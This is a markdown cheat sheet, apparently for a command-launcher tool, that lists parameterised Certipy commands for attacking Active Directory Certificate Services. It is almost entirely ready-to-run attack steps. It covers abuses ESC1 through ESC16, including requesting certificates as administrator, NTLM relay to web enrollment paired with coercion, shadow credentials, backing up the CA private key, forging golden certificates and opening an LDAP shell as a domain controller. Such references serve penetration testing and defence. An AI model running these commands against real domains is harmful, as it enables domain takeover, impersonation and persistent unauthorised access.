# Certipy

<!-- cheat
export certipy_auth
var auth_method = printf 'hash\tUse NT hash\npassword\tUse password\nkerberos\tUse Kerberos ticket\n' --- --delimiter '\t' --fzf-overrides "--with-nth=2 --header=Select\ authentication\ mode\ (Kerberos\ needs\ no\ credential)" --map "cut -f1"

if $auth_method != kerberos
var credential --- --header "Credential"
fi

if $auth_method == hash
var auth_flags := -hashes :$credential
fi

if $auth_method == password
var auth_flags := -p $credential
fi

if $auth_method == kerberos
var auth_flags := -k
fi
-->

## certipy (ADCS)

### find

Enumerate ADCS: pulls CA list, templates, ESC1 through ESC15 vulnerabilities, and ACL findings. `-vulnerable -enabled -text` filters to only published templates with known abuse paths, printed as human readable text.

Find find with Certipy.

```sh title:"Certipy Find Find"
certipy find -u $user@$domain $auth_flags -dc-ip $rhost_ip -vulnerable -enabled -text
```
<!-- cheat
import users
import domain_ip
import certipy_auth
-->

## certipy req (Request Certificate)

### req

Read req with Certipy.

```sh title:"Certipy Read Req"
certipy req -u $user@$domain $auth_flags -ca $ca_name -template $template_name -upn $target_upn -dc-ip $rhost_ip
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var ca_name
var template_name
var target_upn
-->

## certipy auth (Authenticate using Certificate)

### auth

Read auth with Certipy.

```sh title:"Certipy Read Auth"
certipy auth -u $user@$domain $auth_flags -pfx $pfx_file -dc-ip $rhost_ip
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var pfx_file
-->

## certipy relay (NTLM Relay to AD CS)

### relay

Run relay with Certipy.

```sh title:"Certipy Run Relay"
certipy relay -u $user@$domain $auth_flags -target http://$target_adcs/certsrv/certfnsh.asp -template $template_name -dc-ip $rhost_ip
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var target_adcs
var template_name
-->

## certipy shadow (Shadow Credentials Attack)

### shadow

Dump shadow with Certipy.

```sh title:"Certipy Dump Shadow"
certipy shadow auto -target $domain -dc-ip $rhost_ip -username $user@$domain $auth_flags -account $target
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var target
-->

## certipy forge (Forge Certificates from Compromised CA)

### Golden Certificate

Forge a cert signed by a stolen CA private key. Works offline, survives CA rotation of user passwords, and lets you impersonate any UPN. Requires `CA.pfx` (usually from DPAPI or LSASS on the CA host).

Read golden certificate with Certipy.

```sh title:"Certipy Read Golden Certificate"
certipy forge -ca-pfx $ca_pfx -upn $target_upn -subject $target_subject -dc-ip $rhost_ip -out $output_pfx
```
<!-- cheat
import users
import domain_ip
var ca_pfx
var target_upn
var target_subject
var output_pfx
-->

## certipy template (Manage Certificate Templates)

### template dump

Dump template dump with Certipy.

```sh title:"Certipy Dump Template Dump"
certipy template -u $user@$domain $auth_flags -template $template_name -dc-ip $rhost_ip -export $template_name.json
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var template_name
-->

## certipy account (Manage AD Certificate-Related Attributes)

### new machine account

Create machine account with Certipy.

```sh title:"Certipy Create Machine Account"
certipy account -u $user@$domain $auth_flags -dc-ip $rhost_ip -add -name $rhost_name -dns $rhost_name
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var rhost_name
-->

## adcs - exec - certipy - remote

### ESC1/ESC2 Step 1 req

Execute ESC1/ESC2 step 1 req with Certipy.

```sh title:"Certipy Execute ESC1/ESC2 Step 1 Req"
certipy req -u $user@$domain $auth_flags -ca $ca -template $template -upn administrator@$domain -dc-ip $rhost_ip
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var ca
var template
-->

### ESC1/ESC2 Step 2 auth

Execute ESC1/ESC2 step 2 auth with Certipy.

```sh title:"Certipy Execute ESC1/ESC2 Step 2 Auth"
certipy auth -pfx administrator.pfx -username administrator@$domain -dc-ip $rhost_ip
```
<!-- cheat
import users
import domain_ip
-->

### ESC3 Step 1 agent cert

Execute ESC3 step 1 agent cert with Certipy.

```sh title:"Certipy Execute ESC3 Step 1 Agent Cert"
certipy req -u $user@$domain $auth_flags -ca $ca -template $template -dc-ip $rhost_ip
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var ca
var template
-->

### ESC3 Step 2 on behalf of

Execute ESC3 step 2 on behalf of with Certipy.

```sh title:"Certipy Execute ESC3 Step 2 on Behalf of"
certipy req -u $user@$domain $auth_flags -ca $ca -template 'User' -on-behalf-of '$domain\administrator' -pfx agent.pfx
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var ca
-->

### ESC3 Step 3 auth

Execute ESC3 step 3 auth with Certipy.

```sh title:"Certipy Execute ESC3 Step 3 Auth"
certipy auth -pfx $pfx -username administrator@$domain -dc-ip $rhost_ip
```
<!-- cheat
import users
import domain_ip
var pfx
-->

### ESC4 Step 1 save template

Execute ESC4 step 1 save template with Certipy.

```sh title:"Certipy Execute ESC4 Step 1 Save Template"
certipy template -u $user@$domain $auth_flags -template $template -save-old -dc-ip $rhost_ip
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var template
-->

### ESC4 Step 2 abuse

Execute ESC4 step 2 abuse with Certipy.

```sh title:"Certipy Execute ESC4 Step 2 Abuse"
certipy req -u $user@$domain $auth_flags -ca $ca -template $template -upn administrator -dc-ip $rhost_ip
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var ca
var template
-->

### ESC4 Step 3 restore

Execute ESC4 step 3 restore with Certipy.

```sh title:"Certipy Execute ESC4 Step 3 Restore"
certipy template -u $user@$domain $auth_flags -template $template -configuration $template.json
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var template
-->

### ESC5 backup CA key

ESC5 abuses object ACL misconfigurations on the CA itself (or related PKI objects). After gaining write access to a critical PKI object (NTAuthCertificates, AIA, CA computer object), backing up the CA private key gives forge capability.

Execute ESC5 backup CA key with Certipy.

```sh title:"Certipy Execute ESC5 Backup CA Key"
certipy ca -u $user@$domain $auth_flags -target $ca_fqdn -config '$ca_fqdn\$ca_config' -backup
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var ca_fqdn
var ca_config
-->

### ESC5 forge golden cert

Execute ESC5 forge golden cert with Certipy.

```sh title:"Certipy Execute ESC5 Forge Golden Cert"
certipy forge -ca-pfx $ca_pfx -upn administrator@$domain -sid $admin_sid -crl 'ldap:///'
```
<!-- cheat
import users
import domain_ip
var ca_pfx
var admin_sid
-->

### ESC6 EDITF_ATTRIBUTESUBJECTALTNAME2

ESC6: the CA has the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag set, which lets you supply an arbitrary SAN in any cert request (including default User templates). Same flow as ESC1 but the misconfig lives on the CA, not the template.

Execute ESC6 EDITF ATTRIBUTESUBJECTALTNAME2 with Certipy.

```sh title:"Certipy Execute ESC6 EDITF ATTRIBUTESUBJECTALTNAME2"
certipy req -u $user@$domain $auth_flags -ca $ca -template User -upn administrator@$domain -dc-ip $rhost_ip
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var ca
-->

### ESC7 add officer

Execute ESC7 add officer with Certipy.

```sh title:"Certipy Execute ESC7 Add Officer"
certipy ca -u $user@$domain $auth_flags -target $ca_fqdn -ca $ca -add-officer $user
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var ca_fqdn
var ca
-->

### ESC7 enable SubCA template

Enable ESC7 enable SubCA template with Certipy.

```sh title:"Certipy Enable ESC7 Enable SubCA Template"
certipy ca -u $user@$domain $auth_flags -target $ca_fqdn -ca $ca -enable-template SubCA
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var ca_fqdn
var ca
-->

### ESC7 submit SubCA req

Execute ESC7 submit SubCA req with Certipy.

```sh title:"Certipy Execute ESC7 Submit SubCA Req"
certipy req -u $user@$domain $auth_flags -ca $ca -template SubCA -upn administrator@$domain -dc-ip $rhost_ip
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var ca
-->

### ESC7 issue pending request

Execute ESC7 issue pending request with Certipy.

```sh title:"Certipy Execute ESC7 Issue Pending Request"
certipy ca -u $user@$domain $auth_flags -target $ca_fqdn -ca $ca -issue-request $request_id
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var ca_fqdn
var ca
var request_id
-->

### ESC7 retrieve issued cert

Execute ESC7 retrieve issued cert with Certipy.

```sh title:"Certipy Execute ESC7 Retrieve Issued Cert"
certipy ca -u $user@$domain $auth_flags -target $ca_fqdn -ca $ca -retrieve $request_id
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var ca_fqdn
var ca
var request_id
-->

### ESC8 / ESC11 relay to web enrollment

ESC8 (HTTP) / ESC11 (RPC) abuse the CA's web enrollment endpoints accepting NTLM. Start the relay; pair with a coercion technique (PetitPotam, Coercer) to force the DC to authenticate. Use `-template DomainController` when relaying a DC$.

Execute ESC8 / ESC11 relay to web enrollment with Certipy.

```sh title:"Certipy Execute ESC8 / ESC11 Relay to Web Enrollment"
certipy relay -target 'https://$ca_fqdn' -template DomainController
```
<!-- cheat
import domain_ip
var ca_fqdn
-->

### ESC8 relay user

Execute ESC8 relay user with Certipy.

```sh title:"Certipy Execute ESC8 Relay User"
certipy relay -target 'https://$ca_fqdn'
```
<!-- cheat
import domain_ip
var ca_fqdn
-->

### ESC9 update victim UPN

Update ESC9 update victim UPN with Certipy.

```sh title:"Certipy Update ESC9 Update Victim UPN"
certipy account -u $user@$domain $auth_flags -dc-ip $rhost_ip -upn administrator -user $victim update
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var victim
-->

### ESC9 / ESC10 shadow credentials

Dump ESC9 / ESC10 shadow credentials with Certipy.

```sh title:"Certipy Dump ESC9 / ESC10 Shadow Credentials"
certipy shadow -u $user@$domain $auth_flags -dc-ip $rhost_ip -account $victim auto
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var victim
-->

### ESC9 request cert as victim

Execute ESC9 request cert as victim with Certipy.

```sh title:"Certipy Execute ESC9 Request Cert as Victim"
certipy req -k -dc-ip $rhost_ip -target $ca_fqdn -ca $ca -template $template
```
<!-- cheat
import domain_ip
var ca_fqdn
var ca
var template
-->

### ESC9 revert victim UPN

Execute ESC9 revert victim UPN with Certipy.

```sh title:"Certipy Execute ESC9 Revert Victim UPN"
certipy account -u $user@$domain $auth_flags -dc-ip $rhost_ip -upn $victim@$domain -user $victim update
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var victim
-->

### ESC10 weak certificate mapping

ESC10 abuses weak certificate mapping in StrongCertificateBindingEnforcement registry. Rewrite victim UPN to target a DC machine account (`DC$`), then PKINIT to LDAP shell as that DC.

Read ESC10 weak certificate mapping with Certipy.

```sh title:"Certipy Read ESC10 Weak Certificate Mapping"
certipy account -u $user@$domain $auth_flags -dc-ip $rhost_ip -upn '$dc_name$@$domain' -user $victim update
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var dc_name
var victim
-->

### ESC10 auth as DC$ ldap-shell

Spawn ESC10 auth as DC$ LDAP shell with Certipy.

```sh title:"Certipy Spawn ESC10 Auth as DC$ LDAP Shell"
certipy auth -pfx $dc_pfx -dc-ip $rhost_ip -ldap-shell
```
<!-- cheat
import domain_ip
var dc_pfx
-->

### ESC15 schema v1 application policy

ESC15: schema v1 templates accept attacker-supplied Application Policies. Request a cert with explicit `Client Authentication` policy + administrator UPN to bypass EKU restrictions.

Read ESC15 schema v1 application policy with Certipy.

```sh title:"Certipy Read ESC15 Schema V1 Application Policy"
certipy req -u $user@$domain $auth_flags -dc-ip $rhost_ip -target $ca_fqdn -ca $ca -template $template -upn administrator@$domain -sid $admin_sid -application-policies 'Client Authentication'
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var ca_fqdn
var ca
var template
var admin_sid
-->

### ESC16 disabled SID security extension

ESC16: the CA has the security SID extension disabled globally (msPKI-Enrollment-Flag `CT_FLAG_NO_SECURITY_EXTENSION` set on the CA). Same flow as ESC9 - rewrite victim UPN, request cert as victim, auth as administrator.

Execute ESC16 disabled SID security extension with Certipy.

```sh title:"Certipy Execute ESC16 Disabled SID Security Extension"
certipy req -k -dc-ip $rhost_ip -target $ca_fqdn -ca $ca -template User
```
<!-- cheat
import domain_ip
var ca_fqdn
var ca
-->
